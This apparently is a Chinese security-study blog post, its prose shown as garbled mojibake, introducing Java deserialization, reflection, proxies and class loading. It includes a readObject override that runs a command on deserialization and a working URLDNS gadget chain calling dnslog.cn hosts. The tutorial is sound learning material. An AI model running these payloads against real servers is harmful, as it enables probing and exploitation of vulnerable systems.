<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Javaååºåˆ—åŒ–ï¼ˆ1ï¼‰â€”â€” åŸºç¡€å…¥é—¨ | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Javaååºåˆ—åŒ–ï¼ˆ1ï¼‰â€”â€” åŸºç¡€å…¥é—¨ | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="å†™åœ¨å‰é¢
è¿™éƒ¨åˆ†çš„å†…å®¹ä¸»è¦å¯¹Bç«™UPç™½æ—¥æ¢¦ç»„é•¿çš„Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—æ•™ç¨‹çš„å­¦ä¹ ï¼Œéå¸¸å¥½çš„æ•™ç¨‹ï¼Œå—ç›Šè‰¯å¤šğŸ‘

Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡
Javaååºåˆ—åŒ–CommonsCollectionsç¯‡

ç”±äºæœ¬äººJavaä»…ä»…æ˜¯Hello ..." />
    <meta name="keywords" content="Javaååºåˆ—åŒ–,JAVA" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Javaååºåˆ—åŒ–ï¼ˆ1ï¼‰â€”â€” åŸºç¡€å…¥é—¨
            </h2>
            <div class="post-info">
              <span>
                2023-10-08
              </span>
              <span>
                8 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
                  # Javaååºåˆ—åŒ–
                </a>
              
                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
                  # JAVA
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-fan-xu-lie-hua-1-ji-chu-ru-men.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</h1>
<p>è¿™éƒ¨åˆ†çš„å†…å®¹ä¸»è¦å¯¹Bç«™UPç™½æ—¥æ¢¦ç»„é•¿çš„Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—æ•™ç¨‹çš„å­¦ä¹ ï¼Œéå¸¸å¥½çš„æ•™ç¨‹ï¼Œå—ç›Šè‰¯å¤šğŸ‘</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV16h411z7o9/">Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡</a></li>
<li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡</a></li>
</ul>
<p>ç”±äºæœ¬äººJavaä»…ä»…æ˜¯Hello Worldçš„æ°´å¹³ï¼Œå­¦ä¹ çš„è¿‡ç¨‹å¤§é‡å€ŸåŠ©ChatGPTçš„è¾…åŠ©ï¼Œæ‰€ä»¥éƒ¨åˆ†å†…å®¹çš„ç†è§£å¯èƒ½ä¼šæœ‰åå·®<br>
<img src="https://skyblu3519.github.io/post-images/1696766374986.png" alt="" loading="lazy"></p>
<p>ä½†ä½ ä¹Ÿæ²¡æ³•æŒ‡æ­£æˆ‘å“ˆå“ˆğŸ˜</p>
<p>Anyway, have fun~</p>
<h1 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h1>
<h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–/ååºåˆ—åŒ–</h2>
<p>é‡ç‚¹æ˜¯<code>ObjectOutputStream</code>ç±»çš„<code>writeObject</code>æ–¹æ³•å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå’Œ<code>ObjectInputStream</code>ç±»çš„<code>readObject</code>æ–¹æ³•å°†ä¸€ä¸²å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ã€‚</p>
<pre><code class="language-java">ObjectOutputStream out = new ObjectOutputStream(outputstream);
out.writeObject(t);

ObjectInputStream in = new ObjectInputStream(inputstream);
Object obj = in.readObject();
</code></pre>
<p>æ³¨æ„ï¼Œåºåˆ—åŒ–çš„å¯¹è±¡è¦ç»§æ‰¿Serializableæ¥å£ã€‚ä¾‹å­ï¼š<br>
Person.java</p>
<pre><code class="language-java">package secss;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    public String name = &quot;noname&quot;;
    private int age = -1;

    Person(){}
    
    public Person(String name, int age){
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString(){
        return &quot;Person &quot; + name + &quot; is &quot; + age;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException{
        ois.defaultReadObject();
        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);
    }
}

</code></pre>
<p>SerTest.java</p>
<pre><code class="language-java">package secss;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;persion.ser&quot;));
        oos.writeObject(obj);
        oos.close();
    }
    public static void main(String[] args) throws Exception{
        Person p = new Person(&quot;sky&quot;, 18);
//        System.out.println(p);
        serialize(p);
    }
}
</code></pre>
<p>UnSerTest.java</p>
<pre><code class="language-java">package secss;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnSerTest {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static void main(String[] args) throws Exception{
        Person p = (Person)unserialize(&quot;Persion.ser&quot;);
        System.out.println(p);
    }
}
</code></pre>
<h2 id="åå°„">åå°„</h2>
<p>è·å–ä¸€ä¸ªåŸå‹ç±»çš„æ–¹æ³•</p>
<pre><code class="language-java">Person p = new Person();
Class c = p.getClass();		// å¯¹ä¸€ä¸ªå®ä¾‹ä½¿ç”¨getClass()æ–¹æ³•
Class c = Class.forName(&quot;secss.Person&quot;);	// å‚æ•°æ˜¯å®Œå…¨é™å®šçš„ç±»åï¼ˆå¸¦ä¸ŠåŒ…ï¼‰
Class&lt;?&gt; stringClass = String.class;	// ç±»å.class
Class c = ClassLoader.getSystemClassLoader().loadClass(&quot;Pseron&quot;); 	// ClassloaderåŠ è½½
</code></pre>
<p>è€Œåå°„æœ¬è´¨ä¸Šæ˜¯æ“ä½œè¿™ä¸ªåŸå‹ç±»ã€‚é¦–å…ˆæ˜¯å®ä¾‹åŒ–</p>
<pre><code class="language-java">// æ„é€ å‡½æ•°åœ¨æ²¡æœ‰å‚æ•°çš„æƒ…å†µä¸‹ç›´æ¥ç”¨newInstance
Person p0 = (Person) c.newInstance();    
System.out.println(p0);

// æ„é€ å‡½æ•°åœ¨æœ‰å‚æ•°çš„æƒ…å†µä¸‹ï¼Œå…ˆç”¨getConstructorè·å–æ„é€ å‡½æ•°
Constructor personconstructor = c.getConstructor(String.class, int.class);  // ä¼ å…¥çš„å‚æ•°æ˜¯Classç±»å‹ï¼Œå¯¹åº”å½¢å‚çš„æ•°æ®ç±»å‹
Person p1 = (Person) personconstructor.newInstance(&quot;sky&quot;, 18);	// æ„é€ å‡½æ•°çš„ç”¨newInstanceåˆ›å»ºå¯¹è±¡
System.out.println(p1);
</code></pre>
<p>ç„¶åæ˜¯æ“ä½œå±æ€§ï¼Œå››ä¸ªæ–¹æ³•getFieldã€getFieldsã€getDeclaredFieldã€getDeclaredFields</p>
<pre><code class="language-java">Field[] personfields = c.getFields();   // è·å–æ‰€æœ‰å±æ€§ï¼Œæ— æ³•è·å–ç§æœ‰ç±»å‹
for (Field f : personfields) {
    System.out.println(f);
}

Field[] personDeclaredfields = c.getDeclaredFields();   // è·å–æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥è·å–ç§æœ‰ç±»å‹
for (Field f : personDeclaredfields) {
    System.out.println(f);
}

Field personage = c.getDeclaredField(&quot;age&quot;);	// è·å–ageå±æ€§
personage.setAccessible(true);	// å› ä¸ºæ˜¯privateï¼Œä¿®æ”¹å€¼è¦ç”¨setAccessibleè®¾ç½®ä¸ºTrue
personage.set(p0, 100);		// ä¿®æ”¹å€¼ï¼ŒæŒ‡å®šä¸€ä¸ªå¯¹è±¡æ˜¯å¿…é¡»çš„
System.out.println(p0)		// æŸ¥çœ‹ä¿®æ”¹ç»“æœ
</code></pre>
<p>ç„¶åæ˜¯æ–¹æ³•è°ƒç”¨ï¼Œå’Œå±æ€§ç±»ä¼¼ä¹Ÿæœ‰å››ä¸ªæ–¹æ³•getMethodã€getMethodsã€getDeclaredMethodã€getDeclaredMethods</p>
<pre><code class="language-java">Method personaction = c.getMethod(&quot;action&quot;, String.class);		// åŒæ ·è¦æŒ‡å®šä¼ å…¥å‚æ•°çš„ç±»å‹
personaction.invoke(p0, &quot;skyskysky&quot;);	// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡
</code></pre>
<h2 id="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</h2>
<p><code>newProxyInstance</code>â€”â€”åˆ›å»ºä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œå‚æ•°è¯´æ˜<br>
<img src="https://skyblu3519.github.io/post-images/1696765684203.png" alt="" loading="lazy"></p>
<p>ä¾‹å­ï¼š</p>
<pre><code class="language-java">IUser user = new IUserImpl();

IUser uu = (IUser)Proxy.newProxyInstance(
        user.getClass().getClassLoader(),
        new Class[]{IUser.class},	// æŒ‰ç…§classæ•°ç»„çš„å½¢å¼ä¼ 
        userproxy	// ä¸€ä¸ªInvocationHandlerç±»
);
</code></pre>
<p>ç„¶åå†™ä¸€ä¸ªç±»ç»§æ‰¿InvocationHandler<br>
<img src="https://skyblu3519.github.io/post-images/1696765700707.png" alt="" loading="lazy"></p>
<p>ä»£ç </p>
<pre><code class="language-java">package secss;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class UserInvocationHandler implements InvocationHandler {
    IUser user;
    public UserInvocationHandler(){}

    public UserInvocationHandler(IUser user){
        this.user = user;	// å®ä¾‹åŒ–çš„æ—¶å€™ä¼ å…¥éœ€è¦ä»£ç†çš„å¯¹è±¡
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println(&quot;Invoke &quot; + method.getName());
        method.invoke(user, args);
        return null;
    }
}
</code></pre>
<p><img src="https://skyblu3519.github.io/post-images/1696765716573.png" alt="" loading="lazy"><br>
methodä½¿ç”¨æ–¹æ³•å’Œåå°„çš„ä¸€æ ·</p>
<p>åŠ¨æ€ä»£ç†çš„åˆ©ç”¨ï¼šåŠ¨æ€ä»£ç†ç±»æ— è®ºè°ƒç”¨ä»€ä¹ˆæ–¹æ³•ï¼Œéƒ½ä¼šèµ°ä¸€éinvokeã€‚</p>
<h2 id="ç±»åŠ è½½">ç±»åŠ è½½</h2>
<p><img src="https://skyblu3519.github.io/post-images/1696765757662.png" alt="" loading="lazy"><br>
åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—<br>
å®ä¾‹åŒ–ï¼ˆä½¿ç”¨ï¼‰ï¼šæ„é€ ä»£ç å—ã€æ„é€ å‡½æ•°</p>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1696765775837.png" alt="" loading="lazy"></figure>
<p>å®éªŒä»£ç ï¼š</p>
<pre><code class="language-java">Class c = Game.class;   // åªä¼šåŠ è½½ç±»
Class.forName(&quot;secss.Game&quot;);    // é»˜è®¤ä¼šåˆå§‹åŒ–ç±»
Class.forName(&quot;secss.Game&quot;, false, ClassLoader.getSystemClassLoader());     // ä¸ä¼šåˆå§‹åŒ–
ClassLoader cl = ClassLoader.getSystemClassLoader();
cl.loadClass(&quot;secss.Game&quot;);     // ä¸è¿›è¡Œåˆå§‹åŒ–
</code></pre>
<p>Gameç±»ï¼š</p>
<pre><code class="language-java">public class Game {
    public static int i = 1;
    static {
        System.out.println(&quot;é™æ€ä»£ç å—&quot;);
    }
    public static void staticAction(){
        System.out.println(&quot;é™æ€æ–¹æ³•&quot;);
    }
    {
        System.out.println(&quot;æ„é€ ä»£ç å—&quot;);
    }
    public Game(){
        System.out.println(&quot;æ— å‚æ„é€ æ–¹æ³•&quot;);
    }
    public Game(int i){
        System.out.println(&quot;æœ‰å‚æ„é€ æ–¹æ³•&quot;);
    }
}
</code></pre>
<p>åŒäº²å§”æ´¾æµç¨‹<br>
<img src="https://skyblu3519.github.io/post-images/1696765791017.png" alt="" loading="lazy"></p>
<ol>
<li>æ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½ï¼šé¦–å…ˆï¼Œå®ƒè°ƒç”¨findLoadedClassæ–¹æ³•æ¥æ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å¦‚æœå·²åŠ è½½ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥ç±»çš„Classå¯¹è±¡ã€‚</li>
<li>ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨ï¼šå¦‚æœç±»è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦æœ‰çˆ¶ç±»åŠ è½½å™¨å­˜åœ¨ã€‚å¦‚æœæœ‰ï¼Œå®ƒä¼šå°è¯•ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨æ¥åŠ è½½è¿™ä¸ªç±»ã€‚å¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥åŠ è½½è¿™ä¸ªç±»ï¼Œå®ƒå°±ä¼šè¿™æ ·åšï¼Œå¦åˆ™ï¼Œæµç¨‹ä¼šç»§ç»­ã€‚</li>
<li>ä½¿ç”¨Bootstrap ClassLoaderï¼šå¦‚æœæ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨æˆ–çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»ï¼Œé‚£ä¹ˆå°†ä½¿ç”¨Bootstrap ClassLoaderæ¥å°è¯•åŠ è½½å®ƒã€‚Bootstrap ClassLoaderæ˜¯JVMçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå¯ä»¥åŠ è½½æ ¸å¿ƒJavaç±»åº“ï¼ˆæ¯”å¦‚java.lang.*ï¼‰ã€‚</li>
<li>ä½¿ç”¨å½“å‰ç±»åŠ è½½å™¨çš„ findClass æ–¹æ³•ï¼šå¦‚æœå‰é¢çš„æ­¥éª¤éƒ½å¤±è´¥äº†ï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨å½“å‰ç±»åŠ è½½å™¨çš„findClassæ–¹æ³•æ¥å°è¯•åŠ è½½è¿™ä¸ªç±»ã€‚è¿™æ˜¯ä½ å¯ä»¥è¦†å†™çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä»¥å®ç°ä½ è‡ªå·±çš„ç±»åŠ è½½é€»è¾‘ã€‚</li>
<li>è°ƒç”¨ defineClass æ–¹æ³•ï¼šå¦‚æœfindClassæ–¹æ³•æ‰¾åˆ°äº†ç±»çš„å­—èŠ‚ç ï¼Œå®ƒåº”è¯¥ä½¿ç”¨defineClassæ–¹æ³•æ¥æ³¨å†Œè¿™ä¸ªç±»åˆ°JVMä¸­ã€‚</li>
<li>é“¾æ¥ç±»ï¼šæœ€åï¼Œå¦‚æœloadClassæ–¹æ³•è¢«è°ƒç”¨æ—¶ä¼ é€’çš„resolveå‚æ•°æ˜¯trueï¼Œå®ƒè¿˜å°†è°ƒç”¨resolveClassæ–¹æ³•æ¥é“¾æ¥è¿™ä¸ªç±»ã€‚é“¾æ¥ç¡®ä¿ç±»å¯ä»¥è¢«æ­£ç¡®ä½¿ç”¨ï¼Œå®ƒæ¶‰åŠéªŒè¯ç±»æ–‡ä»¶å’Œåˆå§‹åŒ–é™æ€å˜é‡ç­‰æ­¥éª¤ã€‚</li>
</ol>
<p>è§†é¢‘å¯¹ä¸‹é¢è¿™ä¸ªè°ƒç”¨é“¾æœ‰è¯¦ç»†çš„è°ƒè¯•ï¼š<br>
<img src="https://skyblu3519.github.io/post-images/1696765808014.png" alt="" loading="lazy"></p>
<p>URLClassLoader ä»»æ„ç±»åŠ è½½:file/http/jar<br>
ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±» ç§æœ‰<br>
Unsafe.defineClass å­—èŠ‚ç åŠ è½½ public ç±»ä¸èƒ½ç›´æ¥ç”Ÿæˆ Spring é‡Œé¢å¯ä»¥ç›´æ¥ç”Ÿæˆ</p>
<h1 id="ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨url-dnsé“¾">ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨â€”â€”URL DNSé“¾</h1>
<p>å…¥å£ç±»HashMapï¼Œé‡å†™äº†readObject<br>
<img src="https://skyblu3519.github.io/post-images/1696765822880.png" alt="" loading="lazy"></p>
<p>åœ¨è§£ækey/valueçš„éƒ¨åˆ†è°ƒç”¨äº†<code>hash</code>å‡½æ•°<br>
<img src="https://skyblu3519.github.io/post-images/1696765849228.png" alt="" loading="lazy"></p>
<p>åœ¨<code>hash</code>è°ƒç”¨äº†keyçš„<code>hashcode</code>æ–¹æ³•<br>
<img src="https://skyblu3519.github.io/post-images/1696765856468.png" alt="" loading="lazy"></p>
<p>ç°åœ¨æ‰¾ä¸€ä¸ªç±»ï¼Œå®ƒçš„hashCodeæ–¹æ³•å­˜åœ¨åˆ©ç”¨ç‚¹ã€‚</p>
<p>URLç±»å¯ä»¥è®©ä½ é€šè¿‡URLå»è¿æ¥ç½‘ç»œæœåŠ¡å™¨å¹¶è·å–èµ„æºï¼Œå®ƒçš„<code>hashCode</code>æ–¹æ³•ä¸º<br>
<img src="https://skyblu3519.github.io/post-images/1696765865219.png" alt="" loading="lazy"></p>
<p>åœ¨hashCodeå€¼ä¸ä¸º-1æ—¶ï¼ˆhashCodeåˆå§‹å€¼ä¸º-1ï¼‰ï¼Œä¼šè°ƒç”¨handlerçš„<code>hashCode</code>æ–¹æ³•ï¼ŒåŒæ—¶ä¿®æ”¹<code>hashCode</code>çš„å€¼ã€‚</p>
<p>è·Ÿè¿›è¿™ä¸ª<code>hashCode</code>æ–¹æ³•ï¼Œæœ‰ä¸€ä¸ªDNSè§£æçš„åŠŸèƒ½ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1696765881752.png" alt="" loading="lazy"></p>
<p>æ‰€ä»¥ä¸€ä¸ªç®€å•çš„åˆ©ç”¨å°±å‡ºæ¥äº†</p>
<pre><code class="language-java">HashMap&lt;URL, Integer&gt; h = new HashMap&lt;&gt;();
h.put(new URL(&quot;http://p63utd.dnslog.cn/&quot;), 1);
serialize(h);
</code></pre>
<p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼ŒHashMapçš„putæ–¹æ³•ä¼šè°ƒç”¨ä¸€æ¬¡<code>hashCode</code>æ–¹æ³•ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1696765906069.png" alt="" loading="lazy"></p>
<p>å®ƒä¼šå°†<code>hashCode</code>çš„å€¼æå‰ä¿®æ”¹ï¼Œè¿›è€Œæ— æ³•åœ¨æœåŠ¡ç«¯æ‰§è¡Œ<code>hashCode</code>æ–¹æ³•ã€‚</p>
<p>ä½¿ç”¨åå°„æ¥è§£å†³è¿™ä¸€é—®é¢˜</p>
<pre><code class="language-java">HashMap&lt;URL, Integer&gt; h = new HashMap&lt;&gt;();
URL url = new URL(&quot;http://sk555.t0vgmg.dnslog.cn/&quot;);

Class c = url.getClass();
Field hashCodeField = c.getDeclaredField(&quot;hashCode&quot;);
hashCodeField.setAccessible(true);

hashCodeField.set(url, 555);	// åœ¨putå‰ä¿®æ”¹hashCodeçš„å€¼ï¼Œé¿å…åºåˆ—åŒ–çš„æ—¶å€™æœ¬åœ°å‘èµ·DNSè¯·æ±‚
h.put(url, 1);
hashCodeField.set(url, -1);		// putä¹‹åæ”¹ä¸º-1

serialize(h);
</code></pre>
<p>HashMap.readObject -&gt; URL.hashCode()</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li>
<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">åŸºç¡€çŸ¥è¯†</a>
<ul>
<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">åºåˆ—åŒ–/ååºåˆ—åŒ–</a></li>
<li><a href="#%E5%8F%8D%E5%B0%84">åå°„</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">åŠ¨æ€ä»£ç†</a></li>
<li><a href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD">ç±»åŠ è½½</a></li>
</ul>
</li>
<li><a href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8url-dns%E9%93%BE">ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨â€”â€”URL DNSé“¾</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/nodejs-sha-xiang-tao-yi/">
              <h3 class="post-title">
                NodeJSæ²™ç®±é€ƒé€¸
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
